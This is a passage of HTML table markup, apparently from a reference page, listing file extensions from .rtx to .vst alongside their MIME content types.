</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.rtx</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/rtf</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.rtx</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/richtext</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.rv</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/vnd.rn-realvideo</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.s</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-asm</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.s3m</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/s3m</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.saveme</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/octet-stream</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.sbk</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-tbook</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.scm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-lotusscreencam</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.scm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-script.guile</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.scm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-script.scheme</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.scm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/x-scm</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.sdml</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/plain</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.sdp</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/sdp</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.sdp</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-sdp</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.sdr</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/sounder</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.sea</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/sea</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.sea</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-sea</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.set</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/set</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.sgm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/sgml</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.sgm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-sgml</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.sgml</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/sgml</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.sgml</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-sgml</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.sh</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-bsh</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.sh</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-sh</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.sh</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-shar</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.sh</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-script.sh</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.shar</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-bsh</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.shar</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-shar</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.shtml</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/html</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.shtml</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-server-parsed-html</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.sid</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-psid</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.sit</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-sit</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.sit</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-stuffit</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.skd</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-koan</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.skm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-koan</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.skp</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-koan</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.skt</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-koan</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.sl</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-seelogo</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.smi</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/smil</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.smil</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/smil</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.snd</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/basic</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.snd</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-adpcm</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.sol</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/solids</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.spc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-pkcs7-certificates</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.spc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-speech</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.spl</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/futuresplash</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.spr</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-sprite</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.sprite</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-sprite</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.src</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-wais-source</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ssi</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-server-parsed-html</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ssm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/streamingmedia</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.sst</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vnd.ms-pki.certstore</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.step</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/step</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.stl</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/sla</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.stl</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vnd.ms-pki.stl</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.stl</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-navistyle</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.stp</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/step</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.sv4cpio</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-sv4cpio</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.sv4crc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-sv4crc</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.svf</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/vnd.dwg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.svf</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/x-dwg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.svr</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-world</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.svr</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">x-world/x-svr</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.swf</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-shockwave-flash</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.t</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-troff</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.talk</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-speech</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.tar</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-tar</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.tbk</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/toolbook</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.tbk</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-tbook</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.tcl</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-tcl</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.tcl</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-script.tcl</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.tcsh</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-script.tcsh</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.tex</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-tex</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.texi</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-texinfo</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.texinfo</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-texinfo</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.text</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/plain</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.text</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/plain</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.tgz</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/gnutar</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.tgz</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-compressed</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.tif</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/tiff</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.tif</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/x-tiff</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.tiff</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/tiff</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.tiff</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/x-tiff</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.tr</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-troff</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.tsi</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/tsp-audio</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.tsp</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/dsptype</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.tsp</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/tsplayer</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.tsv</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/tab-separated-values</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.turbot</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/florian</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.txt</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/plain</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.uil</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-uil</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.uni</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/uri-list</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.unis</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/uri-list</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.unv</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/i-deas</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.uri</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/uri-list</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.uris</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/uri-list</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ustar</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-ustar</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ustar</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">multipart/x-ustar</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.uu</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/octet-stream</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.uu</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-uuencode</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.uue</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-uuencode</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.vcd</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-cdlink</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.vcs</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-vcalendar</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.vda</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vda</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.vdo</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/vdo</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.vew</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/groupwise</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.viv</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/vivo</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.viv</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/vnd.vivo</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.vivo</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/vivo</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.vivo</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/vnd.vivo</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.vmd</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vocaltec-media-desc</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.vmf</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vocaltec-media-file</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.voc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/voc</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.voc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-voc</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.vos</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/vosaic</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.vox</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/voxware</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.vqe</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-twinvq-plugin</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.vqf</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-twinvq</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.vql</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-twinvq-plugin</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.vrml</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-vrml</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.vrml</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">model/vrml</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.vrml</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">x-world/x-vrml</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.vrt</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">x-world/x-vrt</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.vsd</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-visio</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.vst</span></td>
